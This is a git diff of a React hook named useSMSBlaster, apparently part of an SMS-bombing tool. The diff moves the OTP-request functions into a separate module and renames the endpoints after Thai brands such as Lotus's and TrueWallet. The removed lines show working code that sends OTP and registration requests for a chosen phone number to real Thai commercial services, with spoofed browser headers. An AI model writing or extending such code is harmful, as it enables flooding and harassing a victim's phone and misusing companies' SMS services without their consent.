@@ -1,6 +1,7 @@
 import { useState, useRef } from "react";
 import { useToast } from "@/components/ui/use-toast";
 import axios from "axios";
+import { api1, api2, api3, api4 } from "@/services/smsAPIs";
 
 interface LogEntry {
   timestamp: string;
@@ -35,9 +36,7 @@ export const useSMSBlaster = () => {
         status,
         message
       };
-      // เก็บเบอร์ลงในประวัติ
       setPhoneHistory(prev => new Set(prev.add(phone)));
-      // จำกัดการแสดงผลเฉพาะ 50 รายการล่าสุด
       const newLogs = [newLog, ...prev].slice(0, 50);
       return newLogs;
     });
@@ -144,10 +143,10 @@ export const useSMSBlaster = () => {
 
     const sendSMS = async () => {
       const endpoints = [
-        { api: api1, name: 'API 1' },
-        { api: api2, name: 'API 2' },
-        { api: api4, name: 'API 4' },
-        { api: api5, name: 'API 5' }
+        { api: api1, name: 'Lotus\'s' },
+        { api: api2, name: 'TrueWallet' },
+        { api: api3, name: '1112' },
+        { api: api4, name: 'CH3+' }
       ];
 
       for (const { api, name } of endpoints) {
@@ -215,50 +214,4 @@ export const useSMSBlaster = () => {
     handlePhoneSubmit,
     handleApiKeySubmit,
   };
-};
-
-const api1 = async (phone: string) => {
-  const url = `https://www.dataiku-thai.com/api/reg/sms?account=${phone}`;
-  const headers = {
-    'Language': 'th-TH',
-    'Accept': 'application/json, text/plain, */*',
-    'Accept-Encoding': 'gzip, deflate, br',
-  };
-  await axios.get(url, { headers });
-};
-
-const api2 = async (phone: string) => {
-  const url = "https://openapi.bigc.co.th/customer/v1/otp";    
-  const headers = {
-    "Content-Type": "application/json",
-    "Accept": "application/json, text/plain, */*",
-    "Device-Info": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
-    "Language": "th",
-    "Origin": "https://www.bigc.co.th",
-    "Platform": "web-desktop",
-    "Referer": "https://www.bigc.co.th/",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
-    "Version": "1.69.3",
-  };
-  const data = { phone_no: phone };
-  await axios.post(url, data, { headers });
-};
-
-const api4 = async (phone: string) => {
-  const url = "https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp";
-  const data = { mobile_phone_no: phone };
-  await axios.post(url, data);
-};
-
-const api5 = async (phone: string) => {
-  const url = "https://www.siam191.app/api/user/request-register-tac";
-  const data = {
-    sendType: "mobile",
-    currency: "THB",
-    country_code: "66",
-    mobileno: phone,
-    language: "th",
-    langCountry: "th-th"
-  };
-  await axios.post(url, data);
 };
